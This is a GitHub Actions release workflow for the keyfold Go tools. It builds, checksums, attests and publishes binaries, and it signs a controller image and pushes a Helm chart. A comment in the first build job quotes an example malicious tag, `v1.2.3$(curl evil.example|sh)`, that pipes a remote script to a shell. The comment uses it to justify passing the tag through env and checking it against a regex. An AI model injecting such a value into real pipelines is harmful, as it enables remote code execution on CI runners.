name: Release Go Binary

on:
  push:
    tags:
      - 'v*' # Trigger on version tags like v1.0.0, v0.1.0

# Default-deny: every job below re-declares exactly the scopes it needs, so
# a job added later starts with nothing rather than inheriting the repo/org
# default token scope.
permissions: {}

jobs:
  # Client-side tools only: git-keyfold, kubectl-keyfold, keyfold --
  # things a human or a CI job runs directly on their own machine, so a
  # real cross-platform matrix earns its keep here. keyfold-controller
  # is the opposite case -- a Kubernetes component that only ever runs
  # inside its container image, never as a downloaded native binary on
  # someone's laptop -- see build-and-release-controller below, which
  # builds it for Linux only (matching the container image's own
  # linux/amd64+arm64 platform set), not this full matrix.
  build-and-release:
    name: Build and Release
    runs-on: ubuntu-latest
    permissions:
      contents: write # Needed to create releases
      id-token: write # keyless signing / provenance attestations
      attestations: write # actions/attest-build-provenance

    strategy:
      matrix:
        goos: [linux, windows, darwin]
        goarch: [amd64, arm64]
        exclude: # No official Go support for windows/arm64 executables widely used yet
          - goos: windows
            goarch: arm64

    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Set up Go
        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version: '1.27' # must not be older than the `go` directive in go.mod; matches the Dockerfile's golang image

      - name: Build binaries
        env:
          GOOS: ${{ matrix.goos }}
          GOARCH: ${{ matrix.goarch }}
          # Passed as data via `env:`, not interpolated into the script
          # text below -- a tag name is attacker-controlled (anyone who
          # can push a `v*` tag), and a version like
          # `v1.2.3$(curl evil.example|sh)` is a *valid* git ref. Putting
          # `${{ github.ref_name }}` directly into the `run:` string
          # would have the runner's shell parse and execute that
          # command-substitution syntax before this job ever gets to
          # `go build`. Referenced below only as "$VERSION", an ordinary
          # variable expansion that never re-parses its own value as
          # shell syntax.
          VERSION: ${{ github.ref_name }}
        run: |
          # A shell glob's trailing "*" matches any characters, including
          # shell metacharacters, so a `case` pattern here would not
          # actually anchor the end of the string -- grep -E with ^...$
          # does.
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
            echo "Refusing to build: tag '$VERSION' doesn't match vX.Y.Z or vX.Y.Z-suffix" >&2
            exit 1
          fi

          EXT=""
          if [ "$GOOS" = "windows" ]; then
            EXT=".exe"
          fi

          OUTPUT_NAME="git-keyfold-${GOOS}-${GOARCH}${EXT}"
          go build -v -o "${OUTPUT_NAME}" -ldflags="-s -w -X main.version=${VERSION}" ./cmd/git-keyfold
          echo "ASSET_PATH=${OUTPUT_NAME}" >> $GITHUB_ENV

          KUBECTL_OUTPUT_NAME="kubectl-keyfold-${GOOS}-${GOARCH}${EXT}"
          go build -v -o "${KUBECTL_OUTPUT_NAME}" -ldflags="-s -w -X main.version=${VERSION}" ./cmd/kubectl-keyfold
          echo "KUBECTL_ASSET_PATH=${KUBECTL_OUTPUT_NAME}" >> $GITHUB_ENV

          SEAL_OUTPUT_NAME="keyfold-${GOOS}-${GOARCH}${EXT}"
          go build -v -o "${SEAL_OUTPUT_NAME}" -ldflags="-s -w -X main.version=${VERSION}" ./cmd/keyfold
          echo "SEAL_ASSET_PATH=${SEAL_OUTPUT_NAME}" >> $GITHUB_ENV

      - name: Checksum binaries
        run: |
          sha256sum "${{ env.ASSET_PATH }}" > "${{ env.ASSET_PATH }}.sha256"
          sha256sum "${{ env.KUBECTL_ASSET_PATH }}" > "${{ env.KUBECTL_ASSET_PATH }}.sha256"
          sha256sum "${{ env.SEAL_ASSET_PATH }}" > "${{ env.SEAL_ASSET_PATH }}.sha256"

      # SLSA build provenance: a signed statement (GitHub's Fulcio-backed
      # OIDC identity) that these exact bytes were produced by this workflow
      # at this commit. Verify with `gh attestation verify <file> --repo
      # OpScaleHub/keyfold`. Unlike the .sha256 sidecars, this cannot be
      # forged by whoever can edit the release assets.
      - name: Attest build provenance
        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
        with:
          subject-path: |
            ${{ env.ASSET_PATH }}
            ${{ env.KUBECTL_ASSET_PATH }}
            ${{ env.SEAL_ASSET_PATH }}

      - name: Upload Release Asset
        uses: softprops/action-gh-release@efb35369e0ad2afab669f228072c1b0d510eae64 # v3.0.3
        if: startsWith(github.ref, 'refs/tags/')
        with:
          files: |
            ${{ env.ASSET_PATH }}
            ${{ env.ASSET_PATH }}.sha256
            ${{ env.KUBECTL_ASSET_PATH }}
            ${{ env.KUBECTL_ASSET_PATH }}.sha256
            ${{ env.SEAL_ASSET_PATH }}
            ${{ env.SEAL_ASSET_PATH }}.sha256
          # The release will be created automatically if it doesn't exist,
          # using the tag name as the release name.
          # You can customize release notes, etc. here if needed.

  # keyfold-controller: Linux only, matching the container image's own
  # linux/amd64+arm64 platform set. Its real, supported distribution
  # artifact is the container image + Helm chart below -- this standalone
  # binary exists only as a debugging/local-dev convenience (e.g. running the controller directly against a kind
  # cluster without rebuilding an image each time), not as something
  # meant to run outside a Linux/Kubernetes environment.
  build-and-release-controller:
    name: Build and Release (controller, Linux only)
    runs-on: ubuntu-latest
    permissions:
      contents: write
      id-token: write
      attestations: write

    strategy:
      matrix:
        goarch: [amd64, arm64]

    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Set up Go
        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version: '1.27'

      - name: Build binaries
        env:
          GOARCH: ${{ matrix.goarch }}
          VERSION: ${{ github.ref_name }}
        run: |
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
            echo "Refusing to build: tag '$VERSION' doesn't match vX.Y.Z or vX.Y.Z-suffix" >&2
            exit 1
          fi

          GOOS=linux
          CONTROLLER_OUTPUT_NAME="keyfold-controller-linux-${GOARCH}"
          go build -v -o "${CONTROLLER_OUTPUT_NAME}" -ldflags="-s -w -X main.version=${VERSION}" ./cmd/keyfold-controller
          echo "CONTROLLER_ASSET_PATH=${CONTROLLER_OUTPUT_NAME}" >> $GITHUB_ENV

      - name: Checksum binaries
        run: |
          sha256sum "${{ env.CONTROLLER_ASSET_PATH }}" > "${{ env.CONTROLLER_ASSET_PATH }}.sha256"

      - name: Attest build provenance
        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
        with:
          subject-path: |
            ${{ env.CONTROLLER_ASSET_PATH }}

      - name: Upload Release Asset
        uses: softprops/action-gh-release@efb35369e0ad2afab669f228072c1b0d510eae64 # v3.0.3
        if: startsWith(github.ref, 'refs/tags/')
        with:
          files: |
            ${{ env.CONTROLLER_ASSET_PATH }}
            ${{ env.CONTROLLER_ASSET_PATH }}.sha256

  # One SPDX SBOM of the module graph, attached to the release. The
  # container images carry their own (finer-grained) SBOM attestation from
  # the build-push step below. sbom-action auto-attaches to the release on
  # a tag push.
  sbom:
    name: Generate release SBOM
    runs-on: ubuntu-latest
    permissions:
      contents: write # attach the SBOM asset to the release
    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Generate + attach SBOM
        uses: anchore/sbom-action@3ad7283483fc7af8ff2b4ea19663c2d5ca935e26 # v0.24.2
        with:
          path: .
          artifact-name: keyfold-sbom.spdx.json

  docker-release-controller:
    name: Build & push keyfold-controller image
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write # push to GHCR
      id-token: write # keyless cosign signing (OIDC)
      attestations: write # provenance/SBOM attestations
    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Validate tag
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
            echo "Refusing to build: tag '$VERSION' doesn't match vX.Y.Z or vX.Y.Z-suffix" >&2
            exit 1
          fi

      - name: Compute lowercase image owner
        # OCI repository names must be all-lowercase; the org name
        # (OpScaleHub) isn't, and using it verbatim fails the push.
        run: echo "OWNER_LC=$(printf '%s' '${{ github.repository_owner }}' | tr '[:upper:]' '[:lower:]')" >> "$GITHUB_ENV"

      - name: Log in to GHCR
        uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1

      - name: Install cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2

      - name: Build and push
        id: build
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          file: Dockerfile
          push: true
          platforms: linux/amd64,linux/arm64
          provenance: mode=max
          sbom: true
          build-args: |
            VERSION=${{ github.ref_name }}
          tags: |
            ghcr.io/${{ env.OWNER_LC }}/keyfold-controller:${{ github.ref_name }}
            ghcr.io/${{ env.OWNER_LC }}/keyfold-controller:latest

      - name: Sign image (keyless)
        env:
          DIGEST: ${{ steps.build.outputs.digest }}
        run: |
          cosign sign --yes \
            "ghcr.io/${OWNER_LC}/keyfold-controller@${DIGEST}"

  chart-release-controller:
    name: Package & push keyfold-controller Helm chart
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write # Needed to push to GHCR (OCI)
    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Validate tag
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
            echo "Refusing to package: tag '$VERSION' doesn't match vX.Y.Z or vX.Y.Z-suffix" >&2
            exit 1
          fi

      - name: Compute lowercase image owner
        run: echo "OWNER_LC=$(printf '%s' '${{ github.repository_owner }}' | tr '[:upper:]' '[:lower:]')" >> "$GITHUB_ENV"

      - name: Set up Helm
        uses: azure/setup-helm@9bc31f4ebc9c6b171d7bfbaa5d006ae7abdb4310 # v5.0.1

      - name: Log in to GHCR
        run: echo "${{ secrets.GITHUB_TOKEN }}" | helm registry login ghcr.io -u ${{ github.actor }} --password-stdin

      - name: Package and push
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          CHART_VERSION="${VERSION#v}"
          helm package ./charts/keyfold \
            --version "$CHART_VERSION" \
            --app-version "$VERSION" \
            --destination /tmp
          helm push "/tmp/keyfold-${CHART_VERSION}.tgz" "oci://ghcr.io/${{ env.OWNER_LC }}/charts"